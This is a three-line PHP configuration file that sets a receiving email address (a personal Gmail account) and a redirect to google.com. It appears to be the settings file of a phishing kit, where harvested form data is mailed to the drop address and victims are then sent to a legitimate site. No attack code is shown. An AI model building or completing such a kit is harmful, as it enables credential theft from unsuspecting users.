<?php 
$Receive_email="yvgreene01@gmail.com";
$redirect="https://www.google.com/";
?>